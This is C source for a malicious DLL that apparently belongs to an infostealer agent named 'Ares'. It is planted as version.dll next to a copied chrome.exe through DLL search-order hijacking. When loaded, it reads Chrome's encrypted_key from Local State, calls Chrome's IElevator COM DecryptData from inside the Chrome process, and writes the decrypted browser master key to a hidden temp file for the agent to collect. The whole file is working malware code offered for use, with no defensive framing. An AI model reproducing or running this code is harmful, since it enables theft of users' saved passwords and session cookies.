/* Ares IElevator DLL — Loaded via DLL search order hijack into chrome.exe
 *
 * When chrome.exe loads, it searches for DLLs in its own directory first.
 * We place this DLL (named version.dll) alongside a copy of chrome.exe.
 * Our DllMain runs in chrome.exe context → IElevator accepts us.
 *
 * Flow:
 *   1. Agent copies chrome.exe + chrome_elf.dll to temp dir
 *   2. Agent compiles/places this DLL as version.dll in same dir
 *   3. Agent launches chrome.exe from temp dir with --no-startup-window
 *   4. DllMain → CoCreateInstance(IElevator) → DecryptData → write key to file
 *   5. Agent reads key file, deletes temp dir
 */

#include <windows.h>
#include <ole2.h>
#include <stdio.h>

/* IElevator COM IDs (Chrome-specific) */
static const GUID CLSID_Elevator = {
    0x708860E0, 0xF641, 0x4611,
    {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}
};

static const GUID IID_IElevator = {
    0x463ABECF, 0x410D, 0x407F,
    {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}
};

/* IElevator vtable (partial) */
typedef struct IElevatorVtbl {
    /* IUnknown */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    /* IElevator */
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(void*, const WCHAR*, const WCHAR*,
        const WCHAR*, const WCHAR*, DWORD, DWORD*);
    HRESULT (STDMETHODCALLTYPE *EncryptData)(void*, BSTR, BSTR*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *DecryptData)(void*, BSTR, BSTR*, DWORD*);
} IElevatorVtbl;

typedef struct IElevator {
    IElevatorVtbl* lpVtbl;
} IElevator;

/* Forward all version.dll exports to real version.dll */
/* We use delay-load or just not forward (chrome doesn't need version.dll critically) */

static void do_decrypt(void)
{
    /* Read encrypted_key from Local State */
    char la[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
    char ls_path[512];
    snprintf(ls_path, sizeof(ls_path), "%s\\Google\\Chrome\\User Data\\Local State", la);

    HANDLE hLS = CreateFileA(ls_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hLS == INVALID_HANDLE_VALUE) return;

    DWORD fsize = GetFileSize(hLS, NULL);
    char* data = (char*)HeapAlloc(GetProcessHeap(), 0, fsize + 1);
    DWORD rd; ReadFile(hLS, data, fsize, &rd, NULL);
    CloseHandle(hLS);
    data[rd] = '\0';

    /* Find encrypted_key */
    char* ek = strstr(data, "\"encrypted_key\":\"");
    if (!ek) { HeapFree(GetProcessHeap(), 0, data); return; }
    ek += 17;
    char* ek_end = strchr(ek, '"');
    if (!ek_end) { HeapFree(GetProcessHeap(), 0, data); return; }
    *ek_end = '\0';

    /* Base64 decode */
    BYTE key_raw[512];
    DWORD key_len = sizeof(key_raw);
    CryptStringToBinaryA(ek, 0, 1 /* CRYPT_STRING_BASE64 */, key_raw, &key_len, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, data);

    if (key_len < 10) return;

    /* Strip "DPAPI" prefix (5 bytes) */
    BYTE* blob = key_raw + 5;
    int blob_len = (int)key_len - 5;

    /* Convert to BSTR for COM call */
    BSTR bsEncrypted = SysAllocStringByteLen((const char*)blob, blob_len);
    if (!bsEncrypted) return;

    /* Call IElevator COM */
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) { SysFreeString(bsEncrypted); return; }

    IElevator* pElevator = NULL;
    hr = CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER,
        &IID_IElevator, (void**)&pElevator);

    if (SUCCEEDED(hr) && pElevator) {
        BSTR bsDecrypted = NULL;
        DWORD dwStatus = 0;

        hr = pElevator->lpVtbl->DecryptData(pElevator, bsEncrypted, &bsDecrypted, &dwStatus);

        if (SUCCEEDED(hr) && bsDecrypted) {
            int decLen = SysStringByteLen(bsDecrypted);
            BYTE* decBytes = (BYTE*)bsDecrypted;

            /* Write decrypted key to temp file */
            char outPath[MAX_PATH];
            GetTempPathA(MAX_PATH, outPath);
            strcat(outPath, "ares_dkey.bin");

            HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hOut != INVALID_HANDLE_VALUE) {
                DWORD wr;
                WriteFile(hOut, decBytes, decLen, &wr, NULL);
                CloseHandle(hOut);
            }

            SysFreeString(bsDecrypted);
        }

        pElevator->lpVtbl->Release(pElevator);
    }

    SysFreeString(bsEncrypted);
    CoUninitialize();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        /* Run decrypt in a separate thread to avoid loader lock */
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)do_decrypt, NULL, 0, NULL);
    }
    return TRUE;
}

/* Dummy export — .def file maps all version.dll exports to this */
void dummy_export(void) {}

